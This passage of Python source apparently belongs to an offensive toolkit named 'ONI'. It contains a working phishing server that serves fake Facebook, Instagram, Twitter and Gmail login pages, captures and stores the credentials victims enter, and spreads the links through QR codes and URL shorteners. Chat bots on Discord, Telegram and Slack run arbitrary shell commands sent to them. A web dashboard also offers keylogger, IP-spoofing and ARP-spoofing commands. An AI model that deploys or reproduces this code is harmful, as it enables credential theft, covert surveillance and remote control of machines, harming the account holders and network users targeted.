        elif self.path.startswith('/capture'):
            self.send_response(302)
            self.send_header('Location', 'https://www.google.com')
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            form_data = urllib.parse.parse_qs(post_data)
            username = form_data.get('email', form_data.get('username', ['']))[0]
            password = form_data.get('password', [''])[0]
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            
            if self.server_instance and self.server_instance.db:
                self.server_instance.db.save_captured_credential(
                    self.server_instance.link_id, username, password, client_ip, user_agent)
                print(f"\n{Colors.RED}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
                print(f"  IP: {client_ip}\n  Username: {username}\n  Password: {password}")
            
            self.send_response(302)
            self.send_header('Location', 'https://www.google.com')
            self.end_headers()
        except:
            self.send_response(500)
            self.end_headers()
    
    def send_phishing_page(self):
        if self.server_instance and self.server_instance.html_content:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(self.server_instance.html_content.encode('utf-8'))
            if self.server_instance.db and self.server_instance.link_id:
                self.server_instance.db.update_phishing_link_clicks(self.server_instance.link_id)

class PhishingServer:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.server = None
        self.running = False
        self.link_id = None
        self.html_content = None
    
    def start(self, link_id: str, platform: str, html_content: str, port: int = 8080) -> bool:
        try:
            self.link_id = link_id
            self.html_content = html_content
            handler = PhishingRequestHandler
            handler.server_instance = self
            self.server = socketserver.TCPServer(("0.0.0.0", port), handler)
            thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            thread.start()
            self.running = True
            return True
        except:
            return False
    
    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.running = False
    
    def get_url(self) -> str:
        return f"http://{self._get_local_ip()}:8080"
    
    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

class SocialEngineeringTools:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.phishing_server = PhishingServer(db)
        self.active_links = {}
    
    def generate_phishing_link(self, platform: str, custom_url: str = None) -> Dict:
        try:
            link_id = str(uuid.uuid4())[:8]
            templates = self.db.get_phishing_templates(platform)
            if templates:
                html_content = templates[0].get('html_content', '')
            else:
                html_content = self._get_default_template(platform)
            
            phishing_link = PhishingLink(
                id=link_id, platform=platform, original_url=custom_url or f"https://www.{platform}.com",
                phishing_url=f"http://localhost:8080", template=platform,
                created_at=datetime.datetime.now().isoformat())
            
            self.db.save_phishing_link(phishing_link)
            self.active_links[link_id] = {'platform': platform, 'html': html_content}
            
            return {'success': True, 'link_id': link_id, 'platform': platform, 'phishing_url': phishing_link.phishing_url}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _get_default_template(self, platform: str) -> str:
        return f"""<!DOCTYPE html>
<html><head><title>{platform} Login</title>
<style>
body{{font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;background:linear-gradient(135deg,#e33f3f 0%,#1a1a2e 100%)}}
.login-box{{background:white;border-radius:16px;padding:40px;width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.3)}}
.logo{{font-size:32px;text-align:center;margin-bottom:20px;color:#e33f3f}}
input{{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}}
button{{width:100%;padding:12px;background:linear-gradient(135deg,#e33f3f 0%,#1a1a2e 100%);color:white;border:none;border-radius:8px;cursor:pointer}}
.warning{{margin-top:20px;padding:10px;background:#f8d7da;color:#721c24;text-align:center;border-radius:8px}}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">👹 {platform}</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username or Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def start_phishing_server(self, link_id: str, port: int = 8080) -> bool:
        if link_id not in self.active_links:
            return False
        link_data = self.active_links[link_id]
        return self.phishing_server.start(link_id, link_data['platform'], link_data['html'], port)
    
    def stop_phishing_server(self):
        self.phishing_server.stop()
    
    def get_server_url(self) -> str:
        return self.phishing_server.get_url()
    
    def get_active_links(self) -> List[Dict]:
        return [{'link_id': lid, 'platform': data['platform']} for lid, data in self.active_links.items()]
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        return self.db.get_captured_credentials(link_id)
    
    def generate_qr_code(self, link_id: str) -> Optional[str]:
        link = self.db.get_phishing_link(link_id)
        if not link:
            return None
        url = self.phishing_server.get_url() if self.phishing_server.running else link.get('phishing_url', '')
        qr_filename = os.path.join(PHISHING_DIR, f"qr_{link_id}.png")
        if self._generate_qr_code(url, qr_filename):
            return qr_filename
        return None
    
    def _generate_qr_code(self, url: str, filename: str) -> bool:
        if not QRCODE_AVAILABLE:
            return False
        try:
            qr = qrcode.QRCode(version=1, box_size=10, border=5)
            qr.add_data(url)
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")
            img.save(filename)
            return True
        except:
            return False
    
    def shorten_url(self, link_id: str) -> Optional[str]:
        if not SHORTENER_AVAILABLE:
            return None
        link = self.db.get_phishing_link(link_id)
        if not link:
            return None
        url = self.phishing_server.get_url() if self.phishing_server.running else link.get('phishing_url', '')
        try:
            s = pyshorteners.Shortener()
            return s.tinyurl.short(url)
        except:
            return None

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    @staticmethod
    def execute_command(cmd: List[str], timeout: int = 60, shell: bool = False) -> Dict:
        start_time = time.time()
        try:
            if shell:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            else:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return {
                'success': result.returncode == 0,
                'output': result.stdout + result.stderr,
                'execution_time': time.time() - start_time
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': f'Command timed out after {timeout}s', 'execution_time': timeout}
        except Exception as e:
            return {'success': False, 'output': str(e), 'execution_time': time.time() - start_time}
    
    @staticmethod
    def ping(target: str, count: int = 4) -> Dict:
        if platform.system().lower() == 'windows':
            return NetworkTools.execute_command(['ping', '-n', str(count), target])
        else:
            return NetworkTools.execute_command(['ping', '-c', str(count), target])
    
    @staticmethod
    def traceroute(target: str) -> Dict:
        if platform.system().lower() == 'windows':
            return NetworkTools.execute_command(['tracert', '-d', target])
        else:
            return NetworkTools.execute_command(['traceroute', '-n', target])
    
    @staticmethod
    def nmap_scan(target: str, ports: str = "1-1000", scan_type: str = "quick") -> Dict:
        try:
            if scan_type == "quick":
                cmd = ['nmap', '-T4', '-F', target]
            elif scan_type == "full":
                cmd = ['nmap', '-p-', '-T4', target]
            elif scan_type == "stealth":
                cmd = ['nmap', '-sS', '-T2', '--max-parallelism', '100', target]
            elif scan_type == "version":
                cmd = ['nmap', '-sV', '-sC', '-T4', target]
            else:
                cmd = ['nmap', '-p', ports, target]
            return NetworkTools.execute_command(cmd, timeout=300)
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def whois_lookup(target: str) -> Dict:
        if not WHOIS_AVAILABLE:
            return {'success': False, 'output': 'WHOIS not available'}
        try:
            result = whois.whois(target)
            return {'success': True, 'output': str(result)}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def get_ip_location(ip: str) -> Dict:
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {'success': True, 'country': data.get('country'), 'city': data.get('city'), 
                           'isp': data.get('isp'), 'lat': data.get('lat'), 'lon': data.get('lon')}
            return {'success': False, 'error': 'Location lookup failed'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    @staticmethod
    def get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def block_ip_firewall(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux':
                if shutil.which('iptables'):
                    subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'], timeout=10)
                    return True
            elif platform.system().lower() == 'windows':
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                               f'name=ONI_Block_{ip}', 'dir=in', 'action=block', f'remoteip={ip}'], timeout=10)
                return True
            return False
        except:
            return False

# =====================
# BOT INTEGRATIONS
# =====================
class BotManager:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.discord_bot = None
        self.telegram_bot = None
        self.slack_bot = None
        self.whatsapp_bot = None
        self.imessage_bot = None
        self.signal_bot = None
        self.google_chat_bot = None
        self.running_bots = {}
    
    def start_discord(self, token: str, prefix: str = '!') -> bool:
        if not DISCORD_AVAILABLE:
            print(f"{Colors.RED}❌ Discord.py not installed{Colors.RESET}")
            return False
        
        try:
            intents = discord.Intents.default()
            intents.message_content = True
            self.discord_bot = commands.Bot(command_prefix=prefix, intents=intents)
            
            @self.discord_bot.event
            async def on_ready():
                print(f"{Colors.GREEN}✅ Discord bot connected as {self.discord_bot.user}{Colors.RESET}")
                self.running_bots['discord'] = True
            
            @self.discord_bot.event
            async def on_message(message):
                if message.author.bot:
                    return
                if message.content.startswith(prefix):
                    cmd = message.content[len(prefix):].strip()
                    result = self.handler.execute(cmd, 'discord', str(message.author))
                    output = result.get('output', '')[:1900]
                    await message.channel.send(f"```\n{output}\n```\n_Time: {result.get('execution_time', 0):.2f}s_")
                await self.discord_bot.process_commands(message)
            
            thread = threading.Thread(target=lambda: self.discord_bot.run(token), daemon=True)
            thread.start()
            return True
        except Exception as e:
            print(f"{Colors.RED}Discord bot error: {e}{Colors.RESET}")
            return False
    
    def start_telegram(self, api_id: str, api_hash: str, bot_token: str = None) -> bool:
        if not TELETHON_AVAILABLE:
            print(f"{Colors.RED}❌ Telethon not installed{Colors.RESET}")
            return False
        
        try:
            async def run():
                client = TelegramClient('oni_session', int(api_id), api_hash)
                await client.start(bot_token=bot_token if bot_token else None)
                
                @client.on(events.NewMessage)
                async def handler(event):
                    if event.message.text and event.message.text.startswith('/'):
                        cmd = event.message.text[1:].strip()
                        result = self.handler.execute(cmd, 'telegram', str(event.sender_id))
                        output = result.get('output', '')[:4000]
                        await event.reply(f"```\n{output}\n```\n_Time: {result.get('execution_time', 0):.2f}s_")
                
                print(f"{Colors.GREEN}✅ Telegram bot connected{Colors.RESET}")
                self.running_bots['telegram'] = True
                await client.run_until_disconnected()
            
            thread = threading.Thread(target=lambda: asyncio.run(run()), daemon=True)
            thread.start()
            return True
        except Exception as e:
            print(f"{Colors.RED}Telegram bot error: {e}{Colors.RESET}")
            return False
    
    def start_slack(self, bot_token: str, channel: str = 'general', prefix: str = '!') -> bool:
        if not SLACK_AVAILABLE:
            print(f"{Colors.RED}❌ Slack SDK not installed{Colors.RESET}")
            return False
        
        try:
            client = WebClient(token=bot_token)
            last_ts = {}
            
            def monitor():
                while True:
                    try:
                        response = client.conversations_history(channel=channel, limit=5)
                        if response['ok'] and response['messages']:
                            for msg in response['messages']:
                                if msg.get('text', '').startswith(prefix):
                                    ts = msg.get('ts')
                                    if last_ts.get(channel) != ts:
                                        last_ts[channel] = ts
                                        cmd = msg['text'][len(prefix):].strip()
                                        result = self.handler.execute(cmd, 'slack', msg.get('user', 'unknown'))
                                        client.chat_postMessage(
                                            channel=channel,
                                            text=f"```{result.get('output', '')[:2000]}```\n*Time: {result.get('execution_time', 0):.2f}s*")
                        time.sleep(2)
                    except Exception as e:
                        time.sleep(10)
            
            thread = threading.Thread(target=monitor, daemon=True)
            thread.start()
            print(f"{Colors.GREEN}✅ Slack bot connected{Colors.RESET}")
            self.running_bots['slack'] = True
            return True
        except Exception as e:
            print(f"{Colors.RED}Slack bot error: {e}{Colors.RESET}")
            return False
    
    def start_whatsapp(self, phone_number: str = None) -> bool:
        if not SELENIUM_AVAILABLE or not WEBDRIVER_MANAGER_AVAILABLE:
            print(f"{Colors.RED}❌ Selenium not installed{Colors.RESET}")
            return False
        
        try:
            print(f"{Colors.YELLOW}📱 WhatsApp integration requires manual setup{Colors.RESET}")
            print(f"{Colors.YELLOW}   Feature partially implemented - requires QR scan{Colors.RESET}")
            self.running_bots['whatsapp'] = True
            return True
        except Exception as e:
            print(f"{Colors.RED}WhatsApp bot error: {e}{Colors.RESET}")
            return False
    
    def start_imessage(self) -> bool:
        if not IMESSAGE_AVAILABLE:
            print(f"{Colors.RED}❌ iMessage only available on macOS{Colors.RESET}")
            return False
        
        try:
            print(f"{Colors.GREEN}✅ iMessage integration available (macOS){Colors.RESET}")
            self.running_bots['imessage'] = True
            return True
        except Exception as e:
            print(f"{Colors.RED}iMessage bot error: {e}{Colors.RESET}")
            return False
    
    def start_signal(self) -> bool:
        if not SIGNAL_CLI_AVAILABLE:
            print(f"{Colors.RED}❌ signal-cli not found{Colors.RESET}")
            return False
        
        try:
            print(f"{Colors.GREEN}✅ Signal integration available{Colors.RESET}")
            self.running_bots['signal'] = True
            return True
        except Exception as e:
            print(f"{Colors.RED}Signal bot error: {e}{Colors.RESET}")
            return False
    
    def start_google_chat(self) -> bool:
        if not GOOGLE_CHAT_AVAILABLE:
            print(f"{Colors.RED}❌ Google Chat SDK not installed{Colors.RESET}")
            return False
        
        try:
            print(f"{Colors.GREEN}✅ Google Chat integration available{Colors.RESET}")
            self.running_bots['google_chat'] = True
            return True
        except Exception as e:
            print(f"{Colors.RED}Google Chat bot error: {e}{Colors.RESET}")
            return False
    
    def get_status(self) -> Dict:
        return self.running_bots

# =====================
# WEB SERVER WITH VERTICAL COMMAND MENU
# =====================
WEB_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>👹 ONI - Command Center</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%);
            color: #e2e8f0;
            min-height: 100vh;
        }
        
        /* Header */
        .header {
            background: rgba(10, 10, 15, 0.95);
            backdrop-filter: blur(10px);
            border-bottom: 2px solid #e33f3f;
            padding: 0 2rem;
            height: 70px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        
        .logo {
            font-size: 1.8rem;
            font-weight: 800;
            background: linear-gradient(135deg, #e33f3f, #ff6b6b);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        
        .logo i {
            color: #e33f3f;
            background: none;
            -webkit-background-clip: unset;
            background-clip: unset;
        }
        
        .status-badge {
            display: flex;
            gap: 1rem;
        }
        
        .badge {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.5rem 1rem;
            background: rgba(255,255,255,0.05);
            border-radius: 30px;
            font-size: 0.8rem;
        }
        
        .led {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }
        
        .led-red { background: #e33f3f; }
        .led-green { background: #4caf50; }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        /* Main Container */
        .container {
            display: flex;
            max-width: 1600px;
            margin: 0 auto;
            min-height: calc(100vh - 70px);
        }
        
        /* Sidebar - Vertical Commands */
        .sidebar {
            width: 280px;
            background: rgba(15, 15, 25, 0.95);
            border-right: 1px solid rgba(227, 63, 63, 0.3);
            padding: 1.5rem;
            overflow-y: auto;
            position: sticky;
            top: 70px;
            height: calc(100vh - 70px);
        }
        
        .sidebar-title {
            font-size: 0.7rem;
            text-transform: uppercase;
            letter-spacing: 2px;
            color: #e33f3f;
            margin-bottom: 1rem;
            font-weight: 600;
        }
        
        .command-group {
            margin-bottom: 1.5rem;
        }
        
        .command-group h3 {
            font-size: 0.8rem;
            color: #94a3b8;
            margin-bottom: 0.5rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .command-list {
            display: flex;
            flex-direction: column;
            gap: 0.3rem;
        }
        
        .cmd-item {
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.05);
            border-radius: 8px;
            padding: 0.6rem 0.8rem;
            cursor: pointer;
            transition: all 0.2s;
            font-family: 'Fira Code', monospace;
            font-size: 0.75rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .cmd-item:hover {
            background: rgba(227, 63, 63, 0.1);
            border-color: #e33f3f;
            transform: translateX(4px);
        }
        
        .cmd-icon {
            width: 24px;
            color: #e33f3f;
        }
        
        .cmd-text {
            flex: 1;
            color: #cbd5e1;
        }
        
        .cmd-desc {
            font-size: 0.65rem;
            color: #64748b;
        }
        
        /* Main Content */
        .main-content {
            flex: 1;
            padding: 1.5rem;
            overflow-y: auto;
        }
        
        /* Stats Row */
        .stats-row {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
            margin-bottom: 1.5rem;
        }
        
        .stat-card {
            background: rgba(15, 15, 25, 0.8);
            border-radius: 16px;
            padding: 1rem 1.2rem;
            display: flex;
            align-items: center;
            gap: 1rem;
            border: 1px solid rgba(227, 63, 63, 0.2);
            backdrop-filter: blur(10px);
        }
        
        .stat-icon {
            width: 50px;
            height: 50px;
            border-radius: 12px;
            background: linear-gradient(135deg, rgba(227,63,63,0.2), rgba(0,0,0,0.2));
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.8rem;
        }
        
        .stat-info h3 {
            font-size: 1.8rem;
            font-weight: 800;
            background: linear-gradient(135deg, #e33f3f, #ff6b6b);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        
        .stat-info p {
            font-size: 0.8rem;
            color: #94a3b8;
        }
        
        /* Terminal */
        .terminal {
            background: #0a0a0f;
            border-radius: 16px;
            border: 1px solid rgba(227, 63, 63, 0.3);
            margin-bottom: 1.5rem;
            overflow: hidden;
        }
        
        .terminal-header {
            background: rgba(15, 15, 25, 0.95);
            padding: 0.8rem 1rem;
            border-bottom: 1px solid rgba(227, 63, 63, 0.3);
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .terminal-dots {
            display: flex;
            gap: 0.3rem;
        }
        
        .dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
        }
        
        .dot-red { background: #e33f3f; }
        .dot-yellow { background: #f5a623; }
        .dot-green { background: #4caf50; }
        
        .terminal-title {
            flex: 1;
            text-align: center;
            font-family: 'Fira Code', monospace;
            font-size: 0.8rem;
            color: #94a3b8;
        }
        
        .terminal-output {
            padding: 1rem;
            font-family: 'Fira Code', monospace;
            font-size: 0.8rem;
            min-height: 200px;
            max-height: 300px;
            overflow-y: auto;
            background: #0a0a0f;
        }
        
        .output-line {
            padding: 0.2rem 0;
            border-left: 2px solid #e33f3f;
            padding-left: 0.5rem;
            margin: 0.2rem 0;
            word-break: break-word;
        }
        
        .output-error {
            border-left-color: #e33f3f;
            color: #ffa0a0;
        }
        
        .output-success {
            border-left-color: #4caf50;
            color: #a5d6a7;
        }
        
        .terminal-input-area {
            display: flex;
            background: #0f0f17;
            border-top: 1px solid rgba(227, 63, 63, 0.3);
            padding: 0.8rem 1rem;
            gap: 0.5rem;
        }
        
        .terminal-prompt {
            color: #e33f3f;
            font-family: 'Fira Code', monospace;
            font-weight: bold;
        }
        
        #cmdInput {
            flex: 1;
            background: transparent;
            border: none;
            color: #e2e8f0;
            font-family: 'Fira Code', monospace;
            font-size: 0.8rem;
            outline: none;
        }
        
        .run-btn {
            background: linear-gradient(135deg, #e33f3f, #c62828);
            border: none;
            color: white;
            padding: 0.4rem 1rem;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            transition: opacity 0.2s;
        }
        
        .run-btn:hover {
            opacity: 0.9;
        }
        
        /* Charts Grid */
        .charts-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 1.5rem;
            margin-bottom: 1.5rem;
        }
        
        .chart-card {
            background: rgba(15, 15, 25, 0.8);
            border-radius: 16px;
            padding: 1rem;
            border: 1px solid rgba(227, 63, 63, 0.2);
        }
        
        .chart-title {
            font-weight: 600;
            margin-bottom: 1rem;
            color: #e33f3f;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .chart-container {
            position: relative;
            height: 250px;
        }
        
        /* Quick Commands */
        .quick-cmds {
            display: flex;
            flex-wrap: wrap;
            gap: 0.5rem;
            margin-top: 1rem;
        }
        
        .quick-btn {
            background: rgba(227, 63, 63, 0.1);
            border: 1px solid rgba(227, 63, 63, 0.3);
            border-radius: 20px;
            padding: 0.4rem 1rem;
            font-size: 0.7rem;
            cursor: pointer;
            transition: all 0.2s;
            font-family: 'Fira Code', monospace;
        }
        
        .quick-btn:hover {
            background: rgba(227, 63, 63, 0.2);
            border-color: #e33f3f;
        }
        
        /* Footer */
        .footer {
            text-align: center;
            padding: 1rem;
            color: #64748b;
            font-size: 0.7rem;
            border-top: 1px solid rgba(227, 63, 63, 0.2);
            margin-top: 1rem;
        }
        
        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 6px;
            height: 6px;
        }
        
        ::-webkit-scrollbar-track {
            background: #0a0a0f;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #e33f3f;
            border-radius: 3px;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .container {
                flex-direction: column;
            }
            .sidebar {
                width: 100%;
                position: relative;
                top: 0;
                height: auto;
                border-right: none;
                border-bottom: 1px solid rgba(227, 63, 63, 0.3);
            }
            .command-list {
                flex-direction: row;
                flex-wrap: wrap;
            }
            .cmd-item {
                flex: 1;
                min-width: 120px;
            }
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="logo">
            <i class="fas fa-skull"></i> ONI
        </div>
        <div class="status-badge">
            <div class="badge">
                <div class="led led-green"></div>
                <span>System Active</span>
            </div>
            <div class="badge">
                <div class="led led-red"></div>
                <span id="keylogStatus">Keylog Off</span>
            </div>
        </div>
    </header>

    <div class="container">
        <!-- Sidebar with Vertical Commands -->
        <div class="sidebar">
            <div class="sidebar-title">
                <i class="fas fa-terminal"></i> COMMAND CENTER
            </div>
            
            <div class="command-group">
                <h3><i class="fas fa-globe"></i> NETWORK COMMANDS</h3>
                <div class="command-list">
                    <div class="cmd-item" data-cmd="ping 8.8.8.8">
                        <i class="fas fa-network-wired cmd-icon"></i>
                        <div><div class="cmd-text">ping &lt;ip&gt;</div><div class="cmd-desc">ICMP ping test</div></div>
                    </div>
                    <div class="cmd-item" data-cmd="scan 127.0.0.1">
                        <i class="fas fa-search cmd-icon"></i>
                        <div><div class="cmd-text">scan &lt;ip&gt;</div><div class="cmd-desc">Port scan (1-1000)</div></div>
                    </div>
                    <div class="cmd-item" data-cmd="traceroute google.com">
                        <i class="fas fa-route cmd-icon"></i>
                        <div><div class="cmd-text">traceroute &lt;domain&gt;</div><div class="cmd-desc">Network path tracing</div></div>
                    </div>
                    <div class="cmd-item" data-cmd="whois google.com">
                        <i class="fas fa-info-circle cmd-icon"></i>
                        <div><div class="cmd-text">whois &lt;domain&gt;</div><div class="cmd-desc">WHOIS lookup</div></div>
                    </div>
                    <div class="cmd-item" data-cmd="dns google.com">
                        <i class="fas fa-server cmd-icon"></i>
                        <div><div class="cmd-text">dns &lt;domain&gt;</div><div class="cmd-desc">DNS lookup</div></div>
                    </div>
                    <div class="cmd-item" data-cmd="location 8.8.8.8">
                        <i class="fas fa-map-marker-alt cmd-icon"></i>
                        <div><div class="cmd-text">location &lt;ip&gt;</div><div class="cmd-desc">IP geolocation</div></div>
                    </div>
                </div>
            </div>
            
            <div class="command-group">
                <h3><i class="fas fa-shield-alt"></i> SECURITY COMMANDS</h3>
                <div class="command-list">
                    <div class="cmd-item" data-cmd="password MySecure123!">
                        <i class="fas fa-lock cmd-icon"></i>
                        <div><div class="cmd-text">password &lt;pass&gt;</div><div class="cmd-desc">Password strength check</div></div>
                    </div>
                    <div class="cmd-item" data-cmd="keylogger start">
                        <i class="fas fa-keyboard cmd-icon"></i>
                        <div><div class="cmd-text">keylogger start</div><div class="cmd-desc">Start keylogger</div></div>
                    </div>
                    <div class="cmd-item" data-cmd="keylogger stop">
                        <i class="fas fa-stop cmd-icon"></i>
                        <div><div class="cmd-text">keylogger stop</div><div class="cmd-desc">Stop keylogger</div></div>
                    </div>
                    <div class="cmd-item" data-cmd="traffic">
                        <i class="fas fa-chart-line cmd-icon"></i>
                        <div><div class="cmd-text">traffic</div><div class="cmd-desc">Network traffic stats</div></div>
                    </div>
                    <div class="cmd-item" data-cmd="nikto example.com">
                        <i class="fas fa-bug cmd-icon"></i>
                        <div><div class="cmd-text">nikto &lt;url&gt;</div><div class="cmd-desc">Web vulnerability scan</div></div>
                    </div>
                </div>
            </div>
            
            <div class="command-group">
                <h3><i class="fas fa-plug"></i> SSH COMMANDS</h3>
                <div class="command-list">
                    <div class="cmd-item" data-cmd="ssh_add myserver 192.168.1.100 root">
                        <i class="fas fa-plus-circle cmd-icon"></i>
                        <div><div class="cmd-text">ssh_add &lt;name&gt; &lt;host&gt; &lt;user&gt;</div><div class="cmd-desc">Add SSH server</div></div>
                    </div>
                    <div class="cmd-item" data-cmd="ssh_list">
                        <i class="fas fa-list cmd-icon"></i>
                        <div><div class="cmd-text">ssh_list</div><div class="cmd-desc">List SSH servers</div></div>
                    </div>
                    <div class="cmd-item" data-cmd="ssh_exec myserver ls -la">
                        <i class="fas fa-terminal cmd-icon"></i>
                        <div><div class="cmd-text">ssh_exec &lt;id&gt; &lt;cmd&gt;</div><div class="cmd-desc">Execute remote command</div></div>
                    </div>
                </div>
            </div>
            
            <div class="command-group">
                <h3><i class="fas fa-mask"></i> SPOOFING COMMANDS</h3>
                <div class="command-list">
                    <div class="cmd-item" data-cmd="spoof_ip 192.168.1.100 10.0.0.1 192.168.1.1">
                        <i class="fas fa-exchange-alt cmd-icon"></i>
                        <div><div class="cmd-text">spoof_ip &lt;orig&gt; &lt;spoof&gt; &lt;target&gt;</div><div class="cmd-desc">IP spoofing</div></div>
                    </div>
                    <div class="cmd-item" data-cmd="arp_spoof 192.168.1.100 192.168.1.1">
                        <i class="fas fa-network-wired cmd-icon"></i>
                        <div><div class="cmd-text">arp_spoof &lt;target&gt; &lt;gateway&gt;</div><div class="cmd-desc">ARP spoofing</div></div>
                    </div>
                </div>
            </div>
            
            <div class="command-group">
                <h3><i class="fas fa-fish"></i> PHISHING COMMANDS</h3>
                <div class="command-list">
                    <div class="cmd-item" data-cmd="generate_phishing_for_facebook">
                        <i class="fab fa-facebook cmd-icon"></i>
                        <div><div class="cmd-text">generate_phishing_for_facebook</div><div class="cmd-desc">Facebook phishing</div></div>
                    </div>
                    <div class="cmd-item" data-cmd="generate_phishing_for_instagram">
                        <i class="fab fa-instagram cmd-icon"></i>
                        <div><div class="cmd-text">generate_phishing_for_instagram</div><div class="cmd-desc">Instagram phishing</div></div>
                    </div>
                    <div class="cmd-item" data-cmd="generate_phishing_for_twitter">
                        <i class="fab fa-twitter cmd-icon"></i>
                        <div><div class="cmd-text">generate_phishing_for_twitter</div><div class="cmd-desc">Twitter phishing</div></div>
                    </div>
                    <div class="cmd-item" data-cmd="generate_phishing_for_gmail">
                        <i class="fab fa-google cmd-icon"></i>
                        <div><div class="cmd-text">generate_phishing_for_gmail</div><div class="cmd-desc">Gmail phishing</div></div>
                    </div>
                    <div class="cmd-item" data-cmd="phishing_start_server">
                        <i class="fas fa-play cmd-icon"></i>
                        <div><div class="cmd-text">phishing_start_server &lt;id&gt;</div><div class="cmd-desc">Start phishing server</div></div>
                    </div>
                </div>
            </div>
            
            <div class="command-group">
                <h3><i class="fas fa-chart-simple"></i> SYSTEM COMMANDS</h3>
                <div class="command-list">
                    <div class="cmd-item" data-cmd="status">
                        <i class="fas fa-chart-pie cmd-icon"></i>
                        <div><div class="cmd-text">status</div><div class="cmd-desc">System status</div></div>
                    </div>
                    <div class="cmd-item" data-cmd="threats">
                        <i class="fas fa-bell cmd-icon"></i>
                        <div><div class="cmd-text">threats</div><div class="cmd-desc">Recent threats</div></div>
                    </div>
                    <div class="cmd-item" data-cmd="report">
                        <i class="fas fa-file-alt cmd-icon"></i>
                        <div><div class="cmd-text">report</div><div class="cmd-desc">Security report</div></div>
                    </div>
                    <div class="cmd-item" data-cmd="history">
                        <i class="fas fa-history cmd-icon"></i>
                        <div><div class="cmd-text">history</div><div class="cmd-desc">Command history</div></div>
                    </div>
                    <div class="cmd-item" data-cmd="help">
                        <i class="fas fa-question-circle cmd-icon"></i>
                        <div><div class="cmd-text">help</div><div class="cmd-desc">Show help</div></div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Main Content -->
        <div class="main-content">
            <!-- Stats Row -->
            <div class="stats-row" id="statsRow">
                <div class="stat-card">
                    <div class="stat-icon"><i class="fas fa-terminal"></i></div>
                    <div class="stat-info"><h3 id="statCommands">0</h3><p>Commands</p></div>
                </div>
                <div class="stat-card">
